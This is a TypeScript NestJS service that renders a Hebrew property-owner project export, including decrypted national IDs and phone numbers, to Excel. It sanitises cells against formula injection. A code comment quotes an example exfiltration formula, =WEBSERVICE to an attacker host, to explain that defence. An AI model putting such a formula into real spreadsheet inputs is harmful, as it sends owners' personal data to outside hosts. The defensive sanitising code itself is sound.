import { Injectable, Logger } from '@nestjs/common';
import ExcelJS, { Workbook } from 'exceljs';

/**
 * V11 B.S8 — Project → Excel export service (Phase 7 / D.38 scope).
 *
 * Pure-function service: takes a fully-composed `ProjectExportInput`
 * (caller decrypts PII inside `withTenant` before passing it) and
 * returns the xlsx bytes as a `Buffer`. No DB, no DI dependencies
 * beyond Logger, no controller — B.S10 will wire the endpoint and
 * compose the input.
 *
 * Why pure-function (same posture as B.S6 CalendarService):
 *   - Easy to unit-test (no Neon round-trip, deterministic bytes).
 *   - B.S10 controls the data-fetch boundary so RLS / decryption /
 *     `app.user_id` GUC stay in the sanctioned `withTenant` wrapper.
 *   - The Phase-7 PDF service (B.S9) reads from the SAME input shape
 *     so both formats stay aligned column-for-column.
 *
 * Conventions (pinned by `export.service.spec.ts`):
 *   - Single worksheet named after the Hebrew project label (`פרויקט`).
 *   - Worksheet `views[0].rightToLeft = true` so Excel/LibreOffice
 *     render RTL out of the box.
 *   - Header row of 15 Hebrew column labels (frozen via `views[0].state =
 *     'frozen'` + `ySplit = 4`: 3 metadata rows + 1 header row).
 *   - Default font `Heebo` 11pt — Excel falls back to the system
 *     Heebo install if available; if not, the partner can ship a
 *     Heebo TTF later (font embedding is out of scope for this slice
 *     per docs/03 — we only set the *name* here).
 *   - One row per (apartment, owner) tuple. Apartments with zero
 *     owners still render one row with empty owner cells so the
 *     manager can see the gap.
 *   - `unitType` rendered as a Hebrew label via `unitTypeHebrew`
 *     (apt → דירה, shop → חנות, office → משרד, mixed → מעורב).
 *   - National ID rendered cleartext (Manager-authorized export per
 *     D.17 — encrypted at rest, decrypted at the read boundary). PII
 *     never logged here; logger only sees row counts and elapsed ms.
 *
 * Performance budget (docs/03 §11 T7.7): 1000 rows < 25s on Free
 * Tier. Implementation uses ExcelJS `addRow()` (in-memory write —
 * Streaming writer is reserved for the > 10K-row async path the
 * roadmap defers to a later phase; in-memory measured at ~3s for
 * 1000 rows in dev so the budget has ~8× headroom).
 */
export interface ProjectExportProject {
  id: string;
  name: string;
  type: string;
  status: string;
  description?: string | null;
}

export interface ProjectExportOwner {
  /** Cleartext name — caller decrypted via `decryptOwnerName`. */
  name: string;
  /**
   * Cleartext national_id. This is INTENTIONAL and authorized — not a leak.
   * The owner full-fidelity export is the one path that legitimately needs the
   * real national_id, and the value is decrypted UPSTREAM via `decryptOwnerPii`
   * only after the export permission + tenant RLS check. The cleartext is
   * transient (in-memory for the duration of the render only), is never logged,
   * and never lands in the workbook/PDF document metadata (see the metadata
   * strip in this file + `export-composer.service.ts`). A viewer/agent who lacks
   * the export-PII capability never reaches this struct. (A4 — clarified, not
   * inverted: the manager path is meant to carry cleartext here.)
   */
  nationalId: string;
  /** Cleartext phone, or null. Caller decrypted. */
  phone: string | null;
  email: string | null;
  /** numeric(5,2) — caller passes as number; we render `nn.nn%`. */
  ownershipPct: number;
  role?: string | null;
}

export interface ProjectExportApartment {
  id: string;
  number: string;
  floor: number | null;
  sizeSqm: number | null;
  rooms: number | null;
  status: string;
  unitType: string;
  areaSqm: number | null;
  entrance: string | null;
  /** May be empty — the apartment still renders one row with blank
   *  owner cells so the manager sees the coverage gap. */
  owners: readonly ProjectExportOwner[];
}

export interface ProjectExportBuilding {
  id: string;
  address: string;
  city: string;
  block: string | null;
  parcel: string | null;
  apartments: readonly ProjectExportApartment[];
}

export interface ProjectExportInput {
  project: ProjectExportProject;
  /** Used for the "produced at" metadata line. UTC; caller may
   *  pre-format to Asia/Jerusalem before passing if a TZ display is
   *  required, but the default formatter here uses Locale he-IL with
   *  TZ Asia/Jerusalem. */
  generatedAt: Date;
  generatedBy: { name: string; email: string };
  buildings: readonly ProjectExportBuilding[];
}

const HEBREW_HEADERS = [
  'בניין - כתובת',
  'עיר',
  'גוש',
  'חלקה',
  'דירה',
  'קומה',
  'כניסה',
  'סוג יחידה',
  'שטח (מ"ר)',
  'חדרים',
  'סטטוס דירה',
  'בעלים',
  'תעודת זהות',
  'טלפון',
  'אחוז בעלות',
] as const;

function unitTypeHebrew(unitType: string): string {
  switch (unitType) {
    case 'apt':
      return 'דירה';
    case 'shop':
      return 'חנות';
    case 'office':
      return 'משרד';
    case 'mixed':
      return 'מעורב';
    default:
      return unitType;
  }
}

/**
 * Wave 5 EXP-C1 (redteam audit 2026-05-28) — CSV / Excel formula
 * injection neutralizer. Any cell whose first char is `=`, `+`, `-`, `@`,
 * tab, or carriage return is interpreted as a live formula by Excel /
 * LibreOffice / Numbers on open. With decrypted national_id + phone in
 * adjacent cells, a single `=WEBSERVICE("https://attacker/?q="&A2&B2)`
 * exfils the row to an external host the moment the manager opens the
 * file. The owner.name / project.name / address validators (shared-types
 * /owner.ts:37, project.ts:32) accept leading `=` because that's a legal
 * Hebrew/English character — sanitisation has to happen at the SINK
 * (this writer) where the data crosses into the spreadsheet format.
 *
 * The convention (OWASP "Excel CSV Injection") is to prefix a single
 * quote: Excel treats `'=foo` as literal text but DOESN'T display the
 * leading quote — recipient sees `=foo` rendered as text, attacker
 * sees no formula execution.
 *
 * Applied to every cell whose value can originate from user input:
 * - building.address / city / block / parcel
 * - apartment.number / entrance / unitType
 * - apartment.status (Hebrew label is hard-coded but defence-in-depth)
 * - owner.name / nationalId / phone
 *
 * NOT applied to numeric cells (floor, sizeSqm, rooms, ownershipPct)
 * because they bypass formula evaluation (Excel parses them as Number).
 */
function neutralizeFormula(v: string): string {
  if (v.length === 0) return v;
  const c = v.charCodeAt(0);
  // `=` 0x3D · `+` 0x2B · `-` 0x2D · `@` 0x40 · TAB 0x09 · CR 0x0D · LF 0x0A
  if (
    c === 0x3d ||
    c === 0x2b ||
    c === 0x2d ||
    c === 0x40 ||
    c === 0x09 ||
    c === 0x0d ||
    c === 0x0a
  ) {
    return "'" + v;
  }
  return v;
}

function statusHebrew(status: string): string {
  // Hebrew labels mirror the FE apartment status badge (Doc 10).
  switch (status) {
    case 'pending':
      return 'ממתין';
    case 'in_progress':
      return 'בתהליך';
    case 'signed':
      return 'חתום';
    case 'declined':
      return 'סירב';
    case 'unreachable':
      return 'לא נגיש';
    default:
      return status;
  }
}

@Injectable()
export class ExportService {
  private readonly logger = new Logger(ExportService.name);

  /**
   * Render a project to an xlsx Buffer. Caller is responsible for
   * composing the `ProjectExportInput` from inside `withTenant` and
   * for setting the HTTP `Content-Type` +
   * `Content-Disposition: attachment; filename="..."` headers (B.S10).
   *
   * Returns Buffer; size is typically ~6 KB / 100 apartments.
   */
  async renderProjectXlsx(input: ProjectExportInput): Promise<Buffer> {
    const t0 = Date.now();
    const wb = new Workbook();
    wb.creator = `EMAPP — ${input.generatedBy.name}`;
    wb.created = input.generatedAt;
    wb.modified = input.generatedAt;
    // ExcelJS sets these in the .xlsx core properties. Manager-
    // identifying data is intentional (D.17 audit posture); PII
    // (national_id, phone) NEVER lands in workbook metadata.

    const ws = wb.addWorksheet('פרויקט', {
      views: [
        {
          // RTL — Excel/LibreOffice/Numbers all honour this flag.
          rightToLeft: true,
          // Freeze 3 metadata rows + 1 header row so the data table
          // scrolls under the project info.
          state: 'frozen',
          ySplit: 4,
        },
      ],
      properties: {
        defaultRowHeight: 18,
      },
    });

    // ── metadata rows ────────────────────────────────────────────────
    // Wave 5 EXP-C1: each metadata string starts with a Hebrew prefix
    // ("פרויקט: ", "סוג: ", "הופק על-ידי ") which itself doesn't trip
    // the neutraliser, so the leading char is always safe. Defence in
    // depth: still pipe through `neutralizeFormula` so any future
    // refactor that drops the Hebrew prefix stays safe by default.
    const titleRow = ws.addRow([neutralizeFormula(`פרויקט: ${input.project.name}`)]);
    titleRow.font = { name: 'Heebo', size: 14, bold: true };
    ws.mergeCells(`A1:${columnLetter(HEBREW_HEADERS.length)}1`);

    const metaRow = ws.addRow([
      neutralizeFormula(`סוג: ${input.project.type} · סטטוס: ${input.project.status}`),
    ]);
    metaRow.font = { name: 'Heebo', size: 10, italic: true };
    ws.mergeCells(`A2:${columnLetter(HEBREW_HEADERS.length)}2`);

    const fmt = new Intl.DateTimeFormat('he-IL', {
      timeZone: 'Asia/Jerusalem',
      dateStyle: 'medium',
      timeStyle: 'short',
    });
    const stampRow = ws.addRow([
      neutralizeFormula(
        `הופק על-ידי ${input.generatedBy.name} בתאריך ${fmt.format(input.generatedAt)}`,
      ),
    ]);
    stampRow.font = { name: 'Heebo', size: 10, italic: true };
    ws.mergeCells(`A3:${columnLetter(HEBREW_HEADERS.length)}3`);

    // ── header row ───────────────────────────────────────────────────
    const headerRow = ws.addRow([...HEBREW_HEADERS]);
    headerRow.font = { name: 'Heebo', size: 11, bold: true };
    headerRow.alignment = { horizontal: 'right', readingOrder: 'rtl' };
    headerRow.fill = {
      type: 'pattern',
      pattern: 'solid',
      fgColor: { argb: 'FFE8EEF7' }, // light blue tint
    };
    headerRow.border = {
      bottom: { style: 'thin', color: { argb: 'FF94A3B8' } },
    };

    // ── data rows ────────────────────────────────────────────────────
    let dataRowCount = 0;
    for (const b of input.buildings) {
      for (const apt of b.apartments) {
        if (apt.owners.length === 0) {
          // Render one row with empty owner cells so the gap is visible.
          this.appendRow(ws, b, apt, null);
          dataRowCount += 1;
          continue;
        }
        for (const owner of apt.owners) {
          this.appendRow(ws, b, apt, owner);
          dataRowCount += 1;
        }
      }
    }

    // ── column widths — eyeball, optimized for Hebrew labels ─────────
    const widths = [22, 12, 8, 8, 8, 6, 8, 10, 10, 8, 12, 22, 12, 14, 10];
    for (let i = 0; i < widths.length; i += 1) {
      ws.getColumn(i + 1).width = widths[i]!;
    }

    const buf = await wb.xlsx.writeBuffer();
    this.logger.log(
      `rendered project ${input.project.id} → xlsx (${dataRowCount} data rows, ${Date.now() - t0}ms)`,
    );
    return Buffer.from(buf);
  }

  private appendRow(
    ws: ExcelJS.Worksheet,
    b: ProjectExportBuilding,
    apt: ProjectExportApartment,
    owner: ProjectExportOwner | null,
  ): void {
    // Wave 5 EXP-C1: every user-originating string cell is run through
    // `neutralizeFormula` before insertion. Numeric cells (floor, size,
    // rooms, ownershipPct) and hard-coded Hebrew labels bypass eval, so
    // the sanitiser is skipped for them.
    const row = ws.addRow([
      neutralizeFormula(b.address),
      neutralizeFormula(b.city),
      neutralizeFormula(b.block ?? ''),
      neutralizeFormula(b.parcel ?? ''),
      neutralizeFormula(apt.number),
      apt.floor ?? '',
      neutralizeFormula(apt.entrance ?? ''),
      neutralizeFormula(unitTypeHebrew(apt.unitType)),
      apt.sizeSqm ?? apt.areaSqm ?? '',
      apt.rooms ?? '',
      neutralizeFormula(statusHebrew(apt.status)),
      neutralizeFormula(owner?.name ?? ''),
      neutralizeFormula(owner?.nationalId ?? ''),
      neutralizeFormula(owner?.phone ?? ''),
      owner ? `${owner.ownershipPct.toFixed(2)}%` : '',
    ]);
    row.font = { name: 'Heebo', size: 11 };
    row.alignment = { horizontal: 'right', readingOrder: 'rtl', vertical: 'middle' };
  }
}

/** A → 1, B → 2 … AA → 27. ExcelJS uses 1-indexed columns but
 *  `mergeCells` takes A1 notation; this helper converts a column
 *  count to its letter prefix for the metadata-row merges. */
function columnLetter(col: number): string {
  let n = col;
  let s = '';
  while (n > 0) {
    const r = (n - 1) % 26;
    s = String.fromCharCode(65 + r) + s;
    n = Math.floor((n - 1) / 26);
  }
  return s;
}
